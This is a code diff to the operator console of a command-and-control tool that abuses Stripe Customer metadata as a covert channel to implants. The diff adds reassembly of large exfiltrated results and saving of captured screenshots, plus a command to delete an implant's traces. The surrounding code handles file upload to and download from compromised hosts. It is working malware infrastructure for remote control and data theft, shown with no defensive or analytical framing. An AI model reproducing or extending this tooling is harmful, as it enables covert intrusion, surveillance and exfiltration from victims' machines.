@@ -210,7 +210,6 @@ def _get_implant_timeout(implant_id):
     return max(45, int(poll_max_ms / 1000) * 2 + 30)
 
 def wait_for_result(customer_id, timeout=None):
-    # Resolve timeout dynamically if not explicitly given
     if timeout is None:
         timeout = _get_implant_timeout(current_implant) if current_implant else 120
 
@@ -226,18 +225,67 @@ def wait_for_result(customer_id, timeout=None):
         c = stripe_call(stripe.Customer.retrieve, customer_id)
         m = get_metadata(c)
         if m.get("tag") == "c2-done":
-            chunks = int(m.get("chunks", "1"))
-            b64    = "".join(m.get(f"r{i}", "") for i in range(chunks))
-            result = base64.b64decode(b64).decode("utf-8", errors="replace").strip()
-            cwd    = m.get("cwd", "")
-            stripe.Customer.delete(customer_id)
-            print()
+            cwd     = m.get("cwd", "")
+            is_bin  = m.get("binary") == "1"
+
+            # Large result: reassemble raw b64 from multiple Stripe objects
+            if m.get("large") == "1":
+                print(f"\n[*] Large result, collecting {m.get('total_objects')} object(s)...")
+                total_objs   = int(m.get("total_objects", "0"))
+                obj_data     = {}
+                bar_start    = time.time()
+                last_results = []
+                while len(obj_data) < total_objs and time.time() - bar_start < 120:
+                    res = stripe_call(stripe.Customer.search,
+                                      query='name~"c2-done-data-"', limit=100)
+                    last_results = res.data
+                    for obj in res.data:
+                        om = get_metadata(obj)
+                        if om.get("implant") == current_implant and "seq" in om:
+                            seq = int(om["seq"])
+                            if seq not in obj_data:
+                                lc = int(om.get("local_chunks", DATA_FIELDS))
+                                obj_data[seq] = "".join(om.get(f"r{i}", "") for i in range(lc))
+                    if len(obj_data) < total_objs:
+                        time.sleep(1)
+                b64       = "".join(obj_data.get(i, "") for i in range(total_objs))
+                raw_bytes = base64.b64decode(b64)
+                ids_to_del = [o.id for o in last_results
+                              if get_metadata(o).get("implant") == current_implant
+                              and "seq" in get_metadata(o)]
+                ids_to_del.append(customer_id)
+                with ThreadPoolExecutor(max_workers=10) as ex:
+                    list(ex.map(lambda i: stripe.Customer.delete(i), ids_to_del))
+                print()
+            else:
+                # Normal inline result
+                chunks    = int(m.get("chunks", "1"))
+                b64       = "".join(m.get(f"r{i}", "") for i in range(chunks))
+                raw_bytes = base64.b64decode(b64)
+                stripe.Customer.delete(customer_id)
+                print()
+
+            # Binary result (screenshot) - save directly, no text decode
+            if is_bin:
+                if len(raw_bytes) >= 2 and raw_bytes[0] == 0xFF and raw_bytes[1] == 0xD8:
+                    os.makedirs("screenshots", exist_ok=True)
+                    timestamp = time.strftime("%Y%m%d_%H%M%S")
+                    filename  = f"screenshots/{current_implant}_{timestamp}.jpg"
+                    with open(filename, "wb") as f:
+                        f.write(raw_bytes)
+                    return f"[+] Screenshot saved: {filename}  ({len(raw_bytes):,} bytes)", cwd
+                else:
+                    return f"[-] Received binary data but not a valid JPEG ({len(raw_bytes)} bytes)", cwd
+
+            # Text result - decode normally
+            result = raw_bytes.decode("utf-8", errors="replace").strip()
             return result, cwd
+
         remaining = int(timeout - (time.time() - start))
         print(f"\r    [{int(elapsed):>4}s elapsed / {remaining:>4}s remaining]  ", end="", flush=True)
         time.sleep(2)
 
-    print(f"\n[-] Timeout after {timeout}s — implant did not respond")
+    print(f"\n[-] Timeout after {timeout}s - implant did not respond")
     print( "    Tip: use 'config show' to check the implant's current poll interval")
     return None, None
 
@@ -259,16 +307,6 @@ def _chunks_to_objects(chunks):
     return objects
 
 # ── UPLOAD (operator → implant) ───────────────────────────────────────────────
-#
-# Flow:
-#   1. Operator reads local file, base64-encodes it.
-#   2. Splits into groups of DATA_FIELDS chunks per Stripe object.
-#   3. Creates one Customer per group tagged "xfer-upload-data" with:
-#        xfer_id, seq (0-based), total_objects, local_chunks count, r0..rN
-#   4. Creates a final "xfer-upload-done" Customer that tells the implant
-#        where to write the file and how many data objects to reassemble.
-#   5. Implant reassembles, writes file, updates done-object → "c2-done".
-#   6. Operator polls done-object for "c2-done" and reads the status message.
 
 def do_upload(implant_id, local_path, remote_path):
     if not os.path.isfile(local_path):
@@ -391,14 +429,6 @@ def do_upload(implant_id, local_path, remote_path):
     print("\n[-] Upload timeout — implant did not confirm")
 
 # ── DOWNLOAD (implant → operator) ─────────────────────────────────────────────
-#
-# Flow:
-#   1. Operator creates a "xfer-download-req" Customer with remote_path + xfer_id.
-#   2. Implant reads the file, base64-encodes it, creates one Customer per
-#        DATA_FIELDS group tagged "xfer-download-data".
-#   3. Implant updates the req object → "xfer-download-done" with total_objects.
-#   4. Operator collects all data objects in seq order, reassembles, saves locally.
-#   5. Operator deletes all Stripe objects when done.
 
 def do_download(implant_id, remote_path, local_path=None):
     filename = os.path.basename(remote_path.replace("\\", "/"))
@@ -603,6 +633,8 @@ def print_help():
     print("  info                            - current implant info")
     print("  pending                         - show unexecuted commands")
     print("  clear                           - delete stale objects")
+    print("  cls / clear_screen              - clear terminal")
+    print("  delete <implant_id>             - remove implant completely")
     print("  upload <local> <remote>         - send file to implant")
     print("  download <remote> [local]       - pull file from implant")
     print("  screenshot                      - capture screen (Windows only)")
@@ -744,6 +776,59 @@ def show_implant_config(implant_id):
         print("\n  [*] No runtime config set (using compile-time defaults)")
         print(  "      Use 'config preset <profile>' to set configuration\n")
 
+def delete_implant(implant_id):
+    """Remove an implant completely - deletes heartbeat and all associated objects"""
+    global known_implants, current_implant
+    
+    try:
+        # Find heartbeat object
+        hb_id = _get_heartbeat_id(implant_id)
+        if not hb_id:
+            print(f"[-] Implant '{implant_id}' not found")
+            return False
+        
+        print(f"[*] Deleting implant: {implant_id}")
+        
+        # Collect all objects belonging to this implant
+        to_delete = [hb_id]
+        
+        # Search for any pending commands, uploads, downloads for this implant
+        try:
+            results = stripe.Customer.search(query=f'name~"{implant_id}"', limit=100)
+            for c in results.data:
+                m = get_metadata(c)
+                if m.get("implant") == implant_id and c.id != hb_id:
+                    to_delete.append(c.id)
+        except:
+            pass
+        
+        # Delete all objects in parallel
+        print(f"[*] Removing {len(to_delete)} object(s)...")
+        with ThreadPoolExecutor(max_workers=25) as ex:
+            list(ex.map(lambda i: stripe.Customer.delete(i), to_delete))
+        
+        # Clean up local tracking
+        known_implants.discard(implant_id)
+        _heartbeat_id_cache.pop(implant_id, None)
+        _implant_config.pop(implant_id, None)
+        remote_cwd.pop(implant_id, None)
+        
+        # If we just deleted the current implant, unset it
+        if current_implant == implant_id:
+            current_implant = None
+        
+        print(f"[+] Implant '{implant_id}' deleted")
+        return True
+        
+    except Exception as e:
+        print(f"[-] Error deleting implant: {e}")
+        return False
+
+def clear_screen():
+    """Clear the terminal screen"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# ── Main command loop ─────────────────────────────────────────────────────────
 
 while True:
     try:
@@ -813,6 +898,20 @@ while True:
         elif cmd == "clear":
             cleanup_stale()
             print("[*] Stale objects cleared")
+        
+        elif cmd in ["cls", "clear_screen"]:
+            clear_screen()
+        
+        elif cmd.startswith("delete "):
+            target = cmd.split(None, 1)[1].strip() if len(cmd.split()) > 1 else ""
+            if not target:
+                print("[-] Usage: delete <implant_id>")
+            else:
+                confirm = input(f"[!] Delete implant '{target}' and all associated data? (yes/no): ")
+                if confirm.lower() in ["yes", "y"]:
+                    delete_implant(target)
+                else:
+                    print("[-] Deletion cancelled")
         
         elif cmd.startswith("config "):
             if not current_implant:
@@ -907,35 +1006,7 @@ while True:
             if cwd_val:
                 remote_cwd[current_implant] = cwd_val
             if result:
-                # Check if result contains a screenshot (JPEG magic bytes after header)
-                if "[RAW_IMAGE_DATA]" in result:
-                    try:
-                        # Split header from image data
-                        parts = result.split("[RAW_IMAGE_DATA]\n", 1)
-                        if len(parts) == 2:
-                            header = parts[0]
-                            print(f"\n{header}")
-                            
-                            # Extract binary image data
-                            img_data_b64 = parts[1]
-                            img_bytes = base64.b64decode(img_data_b64)
-                            
-                            # Verify JPEG magic bytes
-                            if len(img_bytes) >= 2 and img_bytes[0] == 0xFF and img_bytes[1] == 0xD8:
-                                # Auto-save to screenshots directory
-                                os.makedirs("screenshots", exist_ok=True)
-                                timestamp = time.strftime("%Y%m%d_%H%M%S")
-                                filename = f"screenshots/{current_implant}_{timestamp}.jpg"
-                                with open(filename, "wb") as f:
-                                    f.write(img_bytes)
-                                print(f"[+] Screenshot saved: {filename}\n")
-                            else:
-                                print(f"[!] Invalid image data received\n")
-                    except Exception as e:
-                        print(f"[-] Error processing screenshot: {e}\n")
-                        print(f"\n{result}\n")  # fallback: print raw
-                else:
-                    print(f"\n{result}\n")
+                print(f"\n{result}\n")
 
     except KeyboardInterrupt:
         print("\n[*] Exiting...")
